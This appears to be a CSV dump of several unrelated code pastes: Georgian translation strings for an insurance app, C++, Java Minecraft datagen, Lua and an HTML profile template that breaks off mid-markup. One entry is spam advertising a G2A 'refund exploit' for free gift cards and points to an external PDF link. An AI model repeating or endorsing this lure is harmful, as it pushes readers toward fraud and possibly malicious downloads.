id,title,username,language,date,content
tLBqiy9n,Translations,iko1133,JavaScript,Wednesday 7th of February 2024 05:44:33 PM CDT,"export default {
  enter: ""შესვლა"",
  register: ""რეგისტრაცია"",
  user: ""მომხმარებელი"",
  password: ""პაროლი"",
  newPassword: ""ახალი პაროლი"",
  remember: ""დამახსოვრება"",
  darkTheme: ""მუქი დიზაინი"",
  forgotPassword: ""დაგავწყდა პაროლი?"",
  confirm: ""დადასტურება"",
  main: ""მთავარი"",
  contact: ""კონტაქტი"",
  branches: ""ფილიალები"",
  notifications: ""შეტყობინებები"",
  identificationNumber: ""პირადი ნომერი"",
  phoneNumber: ""მობილურის ნომერი"",
  email: ""ელ. ფოსტა"",
  confirmPassword: ""დაადასტურეთ პაროლი"",
  day: ""დღე"",
  month: ""თვე"",
  year: ""წელი"",
  termsAndPolicy: ""წესებზე და პირობებზე დათანხმება"",
  SMSCode: ""SMS კოდი"",
  passwordRecovery: ""პაროლის აღდგენა"",
  send: ""გაგზავნა"",
  settings: ""პარამეტრები"",
  personalManager: ""პირადი მენეჯერი"",
  validDocuments: ""ვალიდური დოკუმენტი"",
  addRequisites: ""რეკვიზიტების დამატება"",
  yes: ""დიახ"",
  no: ""არა"",
  loadingInProgress: ""მიმდინარეობს მონაცემების ჩატვირთვა..."",
  paymentDate: ""გადახდის თარიღი"",
  paymentLeft: ""გადასახდელი თანხა"",
  info: ""ზოგადი ინფორმაცია"",
  carInfo: ""ავტომობილის ინფორმაცია"",
  medLimitCover: ""სამედიცინო ლიმიტების დაფარვა"",
  paymentGraph: ""გადახდის გრაფიკი"",
  fileNotLargerThan: ""ფაილის ზომა არ უნდა აღემატებოდეს"",
  mb: ""მეგაბაიტს"",
  pleaseAddRequisites: ""გთხოვთ ატვირთოთ ანგარიშის რეკვიზიტები"",
  errorTryAgain: ""დაფიქსირდა შეცდომა, გთხოვთ სცადოთ მოგვიანებით"",
  requestCompensation: ""ანაზღაურების მოთხოვნა"",
  bankRequisites: ""საბანკო რეკვიზიტები"",
  next: ""შემდეგი"",
  date: ""თარიღი"",
  provider: ""პროვაიდერი"",
  address: ""მისამართი"",
  doctor: ""ექიმი"",
  cancelVisit: ""ვიზიტის გაუქმება"",
  visitCanceled: ""ვიზიტი წარმატებით გაუქმდა"",
  alert: ""ყურადღება"",
  cancelVisitAlert: ""დარწმუნებული ხართ რომ გსურთ ამ ვიზიტის გაუქმება?"",
  goBack: ""უკან დაბრუნება"",
  bookingDetails: ""მიმართვის დეტალები"",
  insured: ""დაზღვეული"",
  policy: ""პოლისი"",
  serviceType: ""მომსახურების ტიპი"",
  treatment: ""მკურნალობა"",
  coverage: ""დაფარვა"",
  originalCost: ""მომსახურების ღირებულება"",
  payableAmount: ""გადასახდელი თანხა"",
  clinic: ""კლინიკა"",
  tillDate: ""მოქმედების ვადა"",
  ticketNumber: ""მიმართვის ნომერი"",
  bookVisit: ""ვიზიტის დაჯავშნა"",
  bookingHistory: ""ვიზიტების ისტორია"",
  visitDate: ""ვიზიტის თარიღი"",
  cancelDate: ""გაუქმების თარიღი"",
  providerClinic: ""პროვაიდერი კლინიკა"",
  status: ""სტატუსი"",
  cancelled: ""გაუქმებული"",
  active: ""აქტიური"",
  inactive: ""არააქტიური"",
  couldNotOpenFile: ""ფაილის გადმოწერა ვერ მოხერხდა"",
  roadAccident: ""საგზაო შემთხვევა"",
  claimNumber: ""განცხადების ნომერი"",
  policyNumber: ""პოლისის ნომერი"",
  claimDate: ""განცხადების თარიღი"",
  vehicleGovNumber: ""სახელმწიფო ნომერი"",
  vehicleBrand: ""მარკა/მოდელი"",
  accidentPlace: ""შემთხვევის ადგილი"",
  attachedFiles: ""მიბმული ფაილები"",
  payments: ""გადახდები"",
  policyHolder: ""დამზღვევი"",
  policyPeriod: ""მოქმედების ვადა"",
  totalPremium: ""ჯამური პრემია"",
  manufacturer: ""მწარმოებელი"",
  model: ""მოდელი"",
  color: ""ფერი"",
  bodyType: ""ძარის ტიპი"",
  engineVolume: ""ძრავის მოცულობა"",
  fuelType: ""საწვავის ტიპი"",
  transmission: ""გადაცემის ტიპი"",
  vinCode: ""VIN კოდი"",
  issueDate: ""გამოშვების წელი"",
  certificationNumber: ""სერთიფიცირების ნომერი"",
  paid: ""გადახდილია"",
  notPaid: ""გადასახდელია"",
  carInsurancePolicy: ""ავტომობილის დაზღვევის პოლისი"",
  healthInsurancePolicy: ""ჯანმრთელობის დაზღვევის პოლისი"",
  limit: ""ლიმიტი"",
  remainedLimit: ""დარჩენილი ლიმიტი"",
  selectIban: ""რომელ ანგარიშზე ჩაგირიცხოთ თანხა?"",
  iban: ""ანგარიში"",
  addNewIban: ""ახალი ანგარიშის დამატება"",
  pleaseFillAllFields: ""გთხოვთ შეავსოთ ყველა საჭირო ველი"",
  passwordRecoveryText: ""ერთჯერადი კოდი მოგივათ SMS-ის სახით"",
  medicalCompensation: ""სამედიცინო ანაზღაურება"",
  remuneratedAmount: ""ანაზღაურებული თანხა"",
  remunerationReceiver: ""თანხის მიმღები"",
  attachedFile: ""მიბმული ფაილი"",
  thankYouForUsingOurServices: ""მადლობას გიხდით ჩვენი სერვისით სარგებლობისთვის"",
  backToHome: ""მთავარზე დაბრუნება"",
  yourRequestHasBeenSent: ""თქვენი განაცხადი მიღებულია"",
  ambulanceCallCenter: ""სასწრაფო სამედიცინო დახმარება"",
  passwordRecoveryPhone: ""კოდის მიღება მობილურით"",
  passwordRecoveryEmail: ""კოდის მიღება ელ. ფოსტით"",
  passwordsDoNotMatch: ""პაროლები არ ემთხვევა"",
  passwordLengthError: ""პაროლი უნდა იყოს 6 სიმბოლოზე მეტი"",
  enterCode: ""შეიყვანეთ კოდი"",
  invalidCode: ""კოდი არასწორია"",
  passwordChanged: ""პაროლი წარმატებით შეიცვალა"",
  codeSent: ""კოდი წარმატებით გაიგზავნა!"",
  sendAgain: ""თავიდან გაგზავნა"",
  gpsNeeded: ""საჭიროა GPS ლოკაციაზე დაშვება"",
  enableLocationServicesFromSettings:
    "". გთხოვთ, გაააქტიუროთ precise location პარამეტრი"",
  locationAccuracyLow:
    ""ზუსტი ლოკაციის გაბსაზღვრა ვერ მოხერხდა, სცადეთ კიდევ ერთხელ"",
  autoCompensation: ""ავტო ანაზღაურება"",
  isCarLocationCorrect: ""მანქანა შემთხვევის ადგილიდან გადაადგილებულია?"",
  myPolicies: ""ჩემი პოლისები"",
  requestAmbulance: ""სასწრაფოს გამოძახება"",
  providerClinics: ""პროვაიდერი კლინიკები"",
  bookDoctor: ""ექიმთან ჩაწერა/ჯავშნები"",
  requestWarrantyLetter: ""საგარანტიოს / მიმართვის მოთხოვნა"",
  myHistory: ""ჩემი ისტორია"",
  specialOffers: ""სპეციალური შეთავაზებები"",
  travelInsurance: ""სამოგზაურო დაზღვევა"",
  travelInsuranceDescription:
    ""სამოგზაუროდ წასვლამდე მხოლოდ კარგზე უნდა იფიქრო! მშვიდი და დაცული მოგზაურობისთვის დააზღვიე ისეთი გაუთვალისწინებელი მომენტებიც კი, როგორიც არის: ბარგის დაგვიანება, ბარგის დაკარგვა, რეისის გადადება."",
  travelInsuranceBullet1: ""შენგენი დღეში 2 ლარი"",
  travelInsuranceBullet2: ""მსოფლიო დღეში 3 ლარი"",
  travelInsuranceBullet3:
    ""ბარგის დაკარგვა / ბარგის დაგვიანება / ფრენის გადადება - სტანდარტული 15 ლარი"",
  carInsurance: ""ავტომობილის დაზღვევა"",
  carInsuranceDescription:
    ""გამარტივებული პროცედურების მეშვეობით, სსწრაფად და მარტივად აინაზღაურე ავტოსაგზაო შემთხვევის დროს გამოწვეული ზარალი.\n\nბენეფიტსი გთავაზობთ ავტოდაზღვევის მრავალფეროვან პროდუქტს, რომელიც საშუალებას გაძლევს თავად განსაზღვრო სასურველი პირობები და აირჩიო შესაბამისი პოლისი."",
  carInsuranceBullet1: ""24 საათიანი ავტოასისტენტი"",
  carInsuranceBullet2: ""საწვავის ადგილზე მიწოდება"",
  carInsuranceBullet3: ""საბურავის გამოცვლა/გაბერვა"",
  carInsuranceBullet4: ""ევაკუატორის უფასო მომსახურება"",
  healthCareDescription:
    ""Benefits Global Care-ის საერთაშორისო ჯანმრთელობის პოლისის ფარგლებში შესაძლებლობა გეძლევათ თავისუფალი არჩევანით ისარგებლოთ ბენეფიტსის პარტნიორ 10 000 მდე კლინიკაში მსოფლიოს მასშტაბით. ჩატარებული სამედიცინო მომსახურებაზე ანაზღაურება საერთაშორისო ტარიფების მიხედვით ხორციელდება. იზრუნე შენი და შენი ოჯახის ჯანმრთელობაზე"",
  healthCareBullet1: ""24 საათიანი ასისტენტი"",
  healthCareBullet2: ""10,000 - მდე პარტნიორი კლინიკა"",
  healthCareBullet3: ""საერთაშორისო დაფარვა"",
  healthCareBullet4: ""ფინანსური კომპენსაცია ჰოსპიტალიზაციისას"",
  learnMore: ""გაიგე მეტი"",
  purchese: ""შეძენა"",
  myAppeals: ""ჩემი მიმართვები"",
  appealNumber: ""მიმართვის ნომერი"",
  lossNumber: ""ზარალის ნომერი"",
  vehicleNumber: ""მანქანის ნომერი"",
  compensationsHistory: ""ანაზღაურების ისტორია"",
  selectMailType: ""გთხოვთ აირჩიოთ შეტყობინების ტიპი"",
  enterMailText: ""გთხოვთ შეავსოთ შეტყობინების ტექსტი"",
  notificationSent: ""შეტყობინება წარმატებით გაიგზავნა!"",
  notificationType: ""შეტყობინების ტიპი"",
  enterMailText: ""ტექსტის დაწერა..."",
  attachFiles: ""დამატებით დოკუმენტების ატვირთვა"",
  notification: ""შეტყობინება"",
  sender: ""გამგზავნი"",
  file: ""ფაილი"",
  search: ""ძებნა"",
  received: ""შემოსული"",
  sent: ""გაგზავნილი"",
  personalManagerText: ""გამარჯობა, მზად ვარ დაგეხმარო"",
  additionalInfo: ""დამატებითი ინფორმაცია"",
  position: ""პოზიცია"",
  personalManager: ""პირადი მენეჯერი"",
  registerSuccess: ""თქვენ წარმატებით გაიარეთ რეგისტრაცია!"",
  birthday: ""დაბადების თარიღი"",
  uploadAllFiles: ""გთხოვთ ატვირთოთ ყველა საჭირო დოკუმენტი"",
  takePicOrUpload: ""გადაუღეთ ფოტო დოკუმენტებს ან ატვირთეთ ფაილები"",
  compensationWarning:
    ""3000 ლარის ზემოთ ანაზღაურების მოთხოვნისას, გთხოვთ წარმოადგინოთ ორიგინალი დოკუმენტები"",
  form100: ""ფორმა 100*"",
  incomeOrder: ""შემოსავლის ორდერი*"",
  kvitar: ""ქვითარი*"",
  additionalDocuments: ""დამატებითი დოკუმენტები"",
  leaveComment: ""დატოვეთ კომენტარი (არასავალდებულო)"",
  front: ""წინა*"",
  right: ""მარჯვენა*"",
  left: ""მარცხენა*"",
  back: ""უკანა*"",
  driverOnSite: ""მძღოლი ადგილზეა"",
  policeCalled: ""პატრული გამოძახებულია"",
  visitBooked: ""ვიზიტი წარმატებით დაიჯავშნა"",
  error: ""შეცდომა"",
  areYouSureBookVisit: ""დარწმუნებული ხართ რომ გსურთ ამ ვიზიტის დაჯავშნა?"",
  familyDoctor: ""ოჯახის ექიმი"",
  selectDate: ""აირჩიე თარიღი"",
  selectAccidentType: ""გთხოვთ აირჩიოთ შემთხვევის ტიპი"",
  onroadAccident: ""ავტოსაგზაო შემთხვევა"",
  hail: ""სტიქია"",
  fire: ""ხანძარი"",
  glassDamage: ""მინის დაზიანება"",
  theft: ""ქურდობა"",
  vandalism: ""ვანდალიზმი"",
  fall: ""საგნების ვარდნა"",
  selectInsuredPerson: ""აირჩიე დაზღვეული პირი"",
  appealsHistory: ""მიმართვების ისტორია"",
  warrantyLettersHistory: ""საგარანტიო წერილების ისტორია"",
  autoInsurancePolicy: ""ავტოდაზღვევის პოლისი"",
  wrongCredentials: ""მომხმარებლის სახელი ან პაროლი არასწორია"",
  male: ""მამრობითი"",
  female: ""მდედრობითი"",
  name: ""სახელი"",
  lastName: ""გვარი"",
  nameInLatin: ""სახელი ლათინურად"",
  lastNameInLatin: ""გვარი ლათინურად"",
  sex: ""სქესი"",
  personalNumber: ""პირადი ნომერი"",
  passportNumber: ""პასპორტის ნომერი"",
  mobNumber: ""მობ. ნომერი"",
  add: ""დამატება"",
  actualAddress: ""ფაქტიური მისამართი"",
  travelConfirmationSuccess:
    ""სამოგზაურო დაზღვევა შექმნილია. პოლისი გამოგზავნილია თქვენს მიერ მითითებულ მეილზე. გისურვებთ სასიამოვნო მოგზაურობას!"",
  goBackToMainPage: ""მთავარ გვერდზე დაბრუნება"",
  pleaseAcceptUserTerms: ""გთხოვთ დაეთანხმოთ მომხმარებლის პირობებს"",
  pleaseAcceptInsuranceTerms: ""გთხოვთ დაეთანხმოთ დაზღვევის პირობებს"",
  nameSurname: ""სახელი / გვარი"",
  telNumber: ""ტელეფონის ნომერი"",
  iAgreeWithUserTerms: ""ვეთანხმები მომხმარებლის პირობებს"",
  iAgreeWithInsuranceTerms: ""ვეთანხმები დაზღვევის პირობებს"",
  close: ""დახურვა"",
  travelSelectDetailsBullet1: ""ბარგის დაგვიანება"",
  travelSelectDetailsBullet2:
    ""ფრენის ან სხვა სახით მგზავრობის გამოტოვება გადადება"",
  travelSelectDetailsBullet3: ""ბარგის დაკარგვა"",
  additionalRisksInsurance: ""დამატებითი რისკების დაზღვევა"",
  cost: ""ღირებულება"",
  pleaseSelectNextDate:
    ""გთხოვთ აირჩიოთ განსხვავებული თარიღი, რომელიც პირველის შემდეგ მოდის"",
  addInsuredPerson: ""დაზღვეული პირის დამატება"",
  inADay: ""დღეში"",
  selectTravelInsurance: ""აირჩიე სამოგზაურო პოლისი"",
  shengen: ""შენგენი"",
  world: ""მსოფლიო"",
  warrantyLetter: ""საგარანტიო წერილი"",
  mustClinic: ""კლინიკა*"",
  profilactics: ""პროფილაქტიკური კვლევები"",
  form100NonStar: ""ფორმა 100"",
  calculation: ""კალკულაცია"",
};

"
L2NTf0JU,G2A.com Free Gift Card Guide Feb 2024,ounnuo,GetText,Wednesday 7th of February 2024 05:37:26 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
PDF guide here:
https://drive.google.com/file/d/120kXNJWM5T5u3PGlkQeZCo_nLxzQIlkf/view?usp=g2a_refund_exploit_434840.pdf
 
Working as of
07 February 2024"
u1KrifEr,Untitled,Rofyda_Elghadban1,C++,Wednesday 7th of February 2024 05:29:07 PM CDT," #include <bits/stdc++.h> 
 #define ll long long
 #define ull unsigned long long
 #define pi 3.141592654
 #define NUM 1e18
 #define Mod  1'000'000'007
 #define fixed(n) fixed<<setprecision(n)
 #define cin(v) for(auto &i:v) cin >> i ;
 #define cout(v) for(auto &i:v) cout << i  <<"" "";
 #define vowel(x) (x=='e'||x=='a'||x=='i'||x=='o'||x=='u')
 #define small(x) (x>=97&&x<=122)
 #define capital(x) (x>=65&&x<=90)
 #define Tolower(s) transform(s.begin(),s.end(),s.begin(),::tolower);
 #define Toupper(s) transform(s.begin(),s.end(),s.begin(),::toupper); 
 #define sz(x) (int)(x.size())
 #define all(v) ((v).begin()), ((v).end())
 #define allr(v) ((v).rbegin()), ((v).rend())
 #define updmax(a,b) a=max(a,b)
 #define updmin(a,b) a=min(a,b)
 #define ceil(a,b) ((a/b)+(a%b?1:0))
 /* asc -> 1 2 3 ,des -> 3 2 1 */
 /***********************************************************************************/
 using namespace std;
 void Rofyda_Elghadban(){
  #ifndef ONLINE_JUDGE   
    freopen(""input.txt"", ""r"", stdin), freopen(""output.txt"", ""w"", stdout);
   #endif
    ios_base::sync_with_stdio(false), cin.tie(nullptr), cout.tie(nullptr);
 }

//  bool BS(ll n,ll k,vector<ll>&v,ll mid,ll sum){
//   ll num=sum/mid;
//   if(num<=n+k){
//     return true;
//   }else{
//     return false;
//   }
//  }

 void solve(){
  ll n,k,sum=0;
  cin>>n>>k;
  vector<ll>v(n);
  cin(v);
  sort(allr(v));
  ll l=0,r=v[0],ans=v[0];
  for(int i=0;i<v.size();i++){
    sum+=v[i];
  }
  while(l<=r){
    ll mid=l+(r-l)/2;
    cout<<mid<<"" "";
    ll num=sum/mid;
    cout<<num<<""\n"";
    if(num>n+k){
      ans=mid;
      r=mid-1;
    }else{
      l=mid+1;
    }
  }
  cout<<ans<<""\n"";
 }

 int main(){
  Rofyda_Elghadban(); 
  // int t;
  // cin>>t;
  // while(t--){
  //   solve();
  // }
  solve();
  return 0;
 }"
HAvRptrh,邀您一起看：快猫,xiaomianao666,JavaScript,Wednesday 7th of February 2024 05:02:48 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥快猫@@
qhRbe47A,recipe provider no recipes yet,CreativeMasterBonin,Java,Wednesday 7th of February 2024 04:40:06 PM CDT,"package net.rk.thingamajigs.datagen;

import net.minecraft.advancements.critereon.ItemPredicate;
import net.minecraft.data.PackOutput;
import net.minecraft.data.recipes.*;
import net.minecraft.tags.ItemTags;
import net.minecraft.tags.TagKey;
import net.minecraft.world.item.Item;
import net.minecraft.world.item.crafting.Ingredient;
import net.minecraft.world.level.ItemLike;
import net.minecraft.world.level.block.Blocks;
import net.rk.thingamajigs.block.TBlocks;
import net.rk.thingamajigs.item.TItems;

public class TRecipeProvider extends RecipeProvider {
    public TRecipeProvider(PackOutput po) {
        super(po);
    }

    @Override
    protected void buildRecipes(RecipeOutput ro) {

    }

    public static RecipeBuilder stonecutterAny(Item requiredItem, Ingredient inputItem, Item result, int amt){
        return SingleItemRecipeBuilder.stonecutting(inputItem, RecipeCategory.BUILDING_BLOCKS,result,amt)
                .unlockedBy(""has_item"",inventoryTrigger(ItemPredicate.Builder.item().of(requiredItem).build()));
    }

    public static RecipeBuilder stonecutterAnyWithTag(TagKey<Item> requiredItemTag, Ingredient inputItem, Item result, int amt){
        return SingleItemRecipeBuilder.stonecutting(inputItem,RecipeCategory.BUILDING_BLOCKS,result,amt)
                .unlockedBy(""has_item"",inventoryTrigger(ItemPredicate.Builder.item().of(requiredItemTag).build()));
    }

    public static RecipeBuilder stonecutterType(Ingredient inputItem, Item result, int amt){
        return SingleItemRecipeBuilder.stonecutting(inputItem,RecipeCategory.BUILDING_BLOCKS,result,amt)
                .unlockedBy(""has_planks"",inventoryTrigger(ItemPredicate.Builder.item().of(ItemTags.PLANKS).build()));
    }

    public static RecipeBuilder stonecutterTypeBricks(Ingredient inputItem, Item result, int amt){
        return SingleItemRecipeBuilder.stonecutting(inputItem,RecipeCategory.BUILDING_BLOCKS,result,amt)
                .unlockedBy(""has_bricks"",inventoryTrigger(ItemPredicate.Builder.item().of(Blocks.BRICKS).build()));
    }


    public static RecipeBuilder stonecutterTypeDarkenedStone(Ingredient inputItem, Item result, int amt){
        return SingleItemRecipeBuilder.stonecutting(inputItem,RecipeCategory.BUILDING_BLOCKS,result,amt)
                .unlockedBy(""has_darkened_stone"",inventoryTrigger(ItemPredicate.Builder.item().of(TBlocks.DARKENED_STONE.get()).build()));
    }

    public static RecipeBuilder stonecutterTypeStripeFactory(Ingredient inputItem, Item result, int amt){
        return SingleItemRecipeBuilder.stonecutting(inputItem,RecipeCategory.BUILDING_BLOCKS,result,amt)
                .unlockedBy(""has_factory_component"",inventoryTrigger(ItemPredicate.Builder.item().of(TItems.FACTORY_COMPONENT.get()).build()));
    }


    public static RecipeBuilder balloonItemBuilder(ItemLike balloon, Ingredient dye, int manyBalloons) {
        return ShapedRecipeBuilder.shaped(
                        RecipeCategory.MISC, balloon, manyBalloons)
                .define('#', TItems.RUBBER.get())
                .define('d',dye)
                .pattern(""###"")
                .pattern(""#d#"")
                .pattern(""###"");
    }
}
"
pMKi1phj,Providers for data neoforge,CreativeMasterBonin,Java,Wednesday 7th of February 2024 04:37:49 PM CDT,"package net.rk.thingamajigs.datagen;

import net.neoforged.bus.api.SubscribeEvent;
import net.neoforged.fml.common.Mod;
import net.neoforged.neoforge.data.event.GatherDataEvent;
import net.rk.thingamajigs.Thingamajigs;

@Mod.EventBusSubscriber(modid = Thingamajigs.MODID, bus = Mod.EventBusSubscriber.Bus.MOD)
public class TDataGenerators {
    @SubscribeEvent
    public static void gatherData(GatherDataEvent event){
        final var generator = event.getGenerator();
        final var packOutput = generator.getPackOutput();
        final var existingFileHelper = event.getExistingFileHelper();
        final var lookupProvider = event.getLookupProvider();
        boolean isServer = event.includeServer();
        boolean isClient = event.includeClient();

        generator.addProvider(isServer, new TRecipeProvider(packOutput));

        generator.addProvider(isServer, new TBlockStateProvider(packOutput, existingFileHelper));

        generator.addProvider(isClient, new TItemModelProvider(packOutput,Thingamajigs.MODID,existingFileHelper));
        generator.addProvider(isClient, new TBlockModelProvider(packOutput,Thingamajigs.MODID,existingFileHelper));

        generator.addProvider(true,new TFluidTagProvider(packOutput,lookupProvider, Thingamajigs.MODID,existingFileHelper));

        TBlockTagProvider blockTagGenerator = generator.addProvider(isServer,
                new TBlockTagProvider(packOutput,lookupProvider,existingFileHelper));

        generator.addProvider(isServer,
                new TItemTagProvider(packOutput, lookupProvider, blockTagGenerator.contentsGetter(),existingFileHelper));

        generator.addProvider(isServer, new TWorldGenProvider(packOutput, lookupProvider));
    }
}
"
YRYwtN8e,connected_miner.lua,adriannic,Lua,Wednesday 7th of February 2024 04:23:16 PM CDT,"function checkBlock()
	if turtle.detect() then
		while not turtle.forward() do
			turtle.dig()
		end
		block(""back"")
	end
end

function block(direction)
	if turtle.detectUp() then
		while not turtle.up() do
			turtle.digUp()
		end
		block(""down"")
	end
	turtle.turnLeft()
	checkBlock()
	for _ = 1, 2 do
		turtle.turnRight()
		checkBlock()
	end
	turtle.turnLeft()
	if turtle.detectDown() then
		while not turtle.down() do
			turtle.digDown()
		end
		block(""up"")
	end
	if direction == ""up"" then
		turtle.up()
	elseif direction == ""down"" then
		turtle.down()
	else
		turtle.back()
	end
end

block(""back"")
"
WvrMR9mB,Gossip Code,Ansuperope,HTML,Wednesday 7th of February 2024 03:48:02 PM CDT,"<!----------------------------------------------------

LIVE PREVIEW + RESOURCES & TIPS:
    link

STOR8:
    link
    
    
Do ""Ctrl"" + ""F"" to find and jump to and change info
faster


CUSTOM COLORS
    - SHADOW:       #000 / (0, 0, 0, .7)
    - TEXT & DECOR: #fff / 255, 255, 255
    

INFO TO FILL OUT
    - background image: BG_IMG_LINK
    - character image:  CHAR_IMG_LINK
    - general:          content

---------------------------------------------------->


<div class=""h-100 w-100"" style=""z-index:; position:absolute; top:0; bottom:0; left:0; filter:brightness(50%); background-image:url('https://images.unsplash.com/photo-1486246772917-8947d0f7f541?q=80&w=1935&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D'); background-position:center; background-size:cover; background-repeat:no-repeat;""></div>

<div class=""mx-auto row"" style=""z-index:1000; position:relative; max-width:800px; overflow:hidden; filter:drop-shadow(8px 8px 10px #000); color:#fff;"">
    
    <div class=""col-12""><hr style=""background-color:#fff;""></div>
    
    <!-- LEFT SIDE / MAIN CODE --------------------->
    <div class=""col-lg-8 d-flex row no-gutters"" style=""position:relative; border-radius:10px; 
        background-image:url('https://images.unsplash.com/photo-1486246772917-8947d0f7f541?q=80&w=1935&auto=format&fit=crop&ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D');
        background-size:cover; background-position:center top; background-repeat:no-repeat;"">
        
        <!-- TOP DECOR ----------------------------->
        <div class=""col-12 d-flex my-3"">
            <div class=""col-7 mr-2 pt-2"" style=""background-color:#fff;""></div>
            <div class=""mr-2 pt-2 px-4"" style=""background-color:#fff;""></div>
            <div class=""mr-2 pt-2 px-2"" style=""background-color:#fff;""></div>
            <div class=""pt-2 px-1"" style=""background-color:#fff;""></div>
        </div>
        <!-- END TOP DECOR ------------------------->
        
        
        <!-- NAME + SUB TEXT ----------------------->
        <div class=""col mx-3 mb-3 text-capitalize"" style=""font-style:italic; font-family:'Times New Roman';"">
            <div class=""display-1"" style=""text-shadow:2px 2px #000;"">character name</div>
        
            <div class=""ml-5 display-4"">nickname or title</div>
        </div>
        <!-- END NAME + SUB TEXT ------------------->
        
        
        
        <!-- CHARACTER INFO ------------------------>
        <div class=""col-10 d-flex my-5 mx-auto"" style=""z-index:10; height:410px; background-color:rgba(0, 0, 0, .7);"">
            
            <!-- LEFT DECOR ------------------------>
            <div class=""col-4 mt-3""><div class=""card rounded-0 faded"" style=""height:30%; border-width:2px 0 0 2px; background-color:transparent; border-color:#fff;""></div></div>
            
            
            <!-- MIDDLE BOX ------------------------>
            <div class=""col d-flex row no-gutters my-auto mx-n5"" style=""height:80%;"">
                
                <!-- TAB CONTENT -------------------
                - make sure id is different than one
                - another and match a href in nav
                -
                - id should NOT have # and no spaces
                -
                - only one tab and its href in the
                - nav should have active in the class
                -
                - active tab should have show in class
                ------------------------------------>
                <div class=""tab-content col-12"" style=""overflow:auto; height:310px;"">
                    
                    <!-- TAB 1 --------------------->
                    <div id=""TAB_ID1"" class=""active show tab-pane fade"">
                        <div class=""row no-gutters mb-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">name</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right text-lowercase"">content</div>
                        </div>
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">age</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">gender</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">pronouns </div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">birthday</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">species</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">height</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">role</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        <div class=""row no-gutters my-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">sexuality</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                        
                        <div class=""row no-gutters mt-1 justify-content-between align-items-end"">
                            <div class=""col-auto text-capitalize"" style=""font-style:italic; font-family:'Times New Roman'; font-size:18px; text-shadow:2px 2px #000;"">worth</div>
                            <div class=""col card mb-2 mx-1"" style=""border-color:#fff; border-style:dotted;""></div>
                            <div class=""col-auto text-right"">content</div>
                        </div>
                    
                    </div>
                    <!-- END TAB 1 ----------------->
                    
                    
                    <!-- TAB 2 ---------------------->
                    <div id=""TAB_ID2"" class=""tab-pane fade"">
                        
                        <!-- ABOUT -->
                        <div class=""mb-3"">
                            <div class=""px-3 text-capitalize"" style=""font-size:20px; font-style:italic; font-family:'Times New Roman'; text-shadow:2px 2px #000; border-bottom:1px dotted #fff;"">
                                about
                            </div>
                            
                            <div class=""my-1"">content</div>
                            
                            <div class=""my-1"">content</div>
                        </div>
                        <!-- END ABOUT -->
                        
                        <!-- LIKES -->
                        <div class=""my-3"">
                            <div class=""px-3 text-capitalize"" style=""font-size:20px; font-style:italic; font-family:'Times New Roman'; text-shadow:2px 2px #000; border-bottom:1px dotted #fff;"">likes</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-heart fa-xs mr-2""></i>content</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-heart fa-xs mr-2""></i>content</div>
                            
                            <div class=""my-1""><i class=""fa-regular fa-heart fa-xs mr-2""></i>content</div>
                        </div>
                        <!-- END LIKES -->
                        
                        <!-- DISLIKES -->
                        <div class=""mt-3"">
